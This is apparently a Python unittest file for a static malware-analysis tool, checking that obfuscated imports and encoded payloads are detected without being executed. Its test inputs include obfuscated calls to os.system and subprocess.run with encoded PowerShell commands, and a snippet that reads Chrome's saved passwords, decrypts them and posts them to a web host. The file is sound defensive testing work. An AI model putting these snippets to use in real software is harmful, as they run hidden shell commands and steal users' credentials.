import base64
import io
import json
import sys
import tempfile
import unittest
import zipfile
from pathlib import Path
from unittest.mock import patch

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "src"))
from backend.analyzer import extract_strings
from backend.payloads import inspect_payload, script_findings
from backend.scripts import inspect_python


def archive(members):
    data = io.BytesIO()
    with zipfile.ZipFile(data, "w", compression=zipfile.ZIP_DEFLATED) as target:
        for name, content in members.items():
            target.writestr(name, content)
    return data.getvalue()


class StaticRecoveryTests(unittest.TestCase):
    def test_reconstructed_module_and_attribute_names_reach_behavior_engine(self):
        source = b"""import builtins as b
module = "sub" + "process"
sp = b.__import__(module)
run = getattr(sp, bytes.fromhex("72756e").decode())
run("powershell -enc not-executed")
"""
        report = inspect_python(source, "source")
        self.assertIn("subprocess.run", report["calls"])
        self.assertIn("suspicious_shell", [f["id"] for f in report["findings"]])
        self.assertEqual(report["unresolved_dynamic_imports"], [])

    def test_character_lists_slices_and_literal_join(self):
        source = b"""import importlib
name = ''.join([chr(111),chr(115)])
m = importlib.import_module(name)
f = getattr(m, 'metsys'[::-1])
f('powershell -enc data')
"""
        report = inspect_python(source, "source")
        self.assertIn("os.system", report["calls"])

    def test_xor_template_is_folded_without_calling_the_lambda(self):
        encoded = ",".join(str(ord(c) ^ 22) for c in "subprocess")
        source = f"""decode=lambda *a: ''.join(map(chr,[x ^ 22 for x in a]))
m=__import__(decode({encoded}))
m.run('powershell -enc data')
"""
        report = inspect_python(source.encode(), "source")
        self.assertIn("subprocess.run", report["calls"])
        self.assertTrue(any(s["encoded_name"] for s in report["recovered_symbols"]))

    def test_reassignment_does_not_relabel_earlier_calls(self):
        source = b"""import os
f=os.system
f('powershell -enc data')
f=print
f('hello')
"""
        report = inspect_python(source, "source")
        self.assertIn("os.system", report["calls"])
        self.assertIn("print", report["calls"])

    def test_parameters_and_unknown_branches_do_not_inherit_global_aliases(self):
        report = inspect_python(
            b"""import subprocess as sp
def function(sp):
    sp.run('powershell -enc data')
""",
            "source",
        )
        self.assertNotIn("subprocess.run", report["calls"])
        report = inspect_python(
            b"""m='os'
if condition:
    m = unknown()
x = __import__(m)
x.system('powershell -enc data')
""",
            "source",
        )
        self.assertNotIn("os.system", report["calls"])
        self.assertEqual(report["status"], "limited")

    def test_unknown_custom_decoder_is_never_invoked(self):
        with tempfile.TemporaryDirectory() as directory:
            sentinel = Path(directory) / "should-not-exist"
            source = f"""def decode():
    open({str(sentinel)!r}, 'w').write('executed')
    return 'os'
m = __import__(decode())
exec("open({str(sentinel)!r}, 'w').write('executed')")
"""
            report = inspect_python(source.encode(), "source")
            self.assertFalse(sentinel.exists())
            self.assertEqual(report["status"], "limited")

    def test_decoded_layers_feed_the_same_engine(self):
        payload = b"import os\nos.system('powershell -enc data')"
        source = (
            b"import base64\nexec(base64.b64decode("
            + repr(base64.b64encode(payload)).encode()
            + b"))"
        )
        report = inspect_payload(archive({"main.py": source}))
        self.assertIn("suspicious_shell", [f["id"] for f in script_findings(report)])
        self.assertIn(
            "encoded_script_execution", [f["id"] for f in script_findings(report)]
        )

    def test_recovered_credential_chain_needs_profile_storage_reads_and_decryption(
        self,
    ):
        source = b"""import sqlite3,win32crypt,requests
profile='Google\\\\Chrome\\\\User Data'
name='Login Data'
query='select password_value from logins'
c=sqlite3.connect(name)
v=win32crypt.CryptUnprotectData(data)
requests.post('https://example.org',data=v)
"""
        report = inspect_python(source, "source")
        ids = [f["id"] for f in report["findings"]]
        self.assertIn("browser_credentials", ids)
        self.assertIn("credential_exfiltration", ids)
        without = inspect_python(
            source.replace(b"win32crypt.CryptUnprotectData(data)", b"data"), "source"
        )
        self.assertNotIn("browser_credentials", [f["id"] for f in without["findings"]])
        self.assertNotIn(
            "credential_exfiltration", [f["id"] for f in without["findings"]]
        )

    def test_unrelated_archive_members_do_not_form_behavior_chains(self):
        data = archive(
            {
                "network.py": "import requests\nrequests.get('https://example.org')",
                "writer.py": "open('output', 'wb').write(b'x')",
                "runner.py": "import subprocess\nsubprocess.run('tool')",
            }
        )
        report = inspect_payload(data)
        self.assertNotIn("download_launch", [f["id"] for f in script_findings(report)])
        self.assertEqual(report["status"], "inspected")

    def test_read_only_open_is_not_file_write(self):
        source = b"import requests,subprocess\nrequests.get('https://example.org')\nopen('input','r')\nsubprocess.run('tool')"
        report = inspect_python(source, "source")
        self.assertNotIn("download_launch", [f["id"] for f in report["findings"]])

    def test_native_bytecode_and_nested_archive_limits_are_reported(self):
        report = inspect_payload(
            archive(
                {
                    "a.dll": b"MZ" + b"x" * 100,
                    "b.pyc": b"opaque",
                    "main.py": "print('hello')",
                }
            )
        )
        self.assertEqual(report["status"], "partial")
        statuses = report["archive"]["member_status_counts"]
        self.assertIn("native_uninspected", statuses)
        self.assertIn("bytecode_uninspected", statuses)
        with patch("backend.payloads.MAX_MEMBERS", 1):
            limited = inspect_payload(
                archive({"a.py": "print('a')", "b.py": "print('b')"})
            )
            self.assertEqual(limited["status"], "partial")
            self.assertTrue(limited["archive"]["limitations"])

    def test_huge_literal_expansion_remains_unresolved_and_bounded(self):
        report = inspect_python(b"name = 'x' * (1 << 60)\n__import__(name)", "source")
        self.assertEqual(report["status"], "limited")
        self.assertLess(len(json.dumps(report)), 10000)

    def test_extra_zip_bytes_are_not_mistaken_for_fully_inspected_payload(self):
        data = archive({"main.py": "print('hello')"})
        for wrapped in (b"opaque prefix" + data, data + b"opaque suffix"):
            result = inspect_payload(wrapped)
            self.assertEqual(result["status"], "partial")
            self.assertTrue(result["archive"]["limitations"])

    def test_raw_string_counts_are_facts_not_behaviors(self):
        strings = extract_strings(b"https://example.org cookies 1.2.3.4 example.org")
        self.assertTrue(strings["matches"]["url"])
        self.assertTrue(strings["matches"]["browser_database"])


if __name__ == "__main__":
    unittest.main()
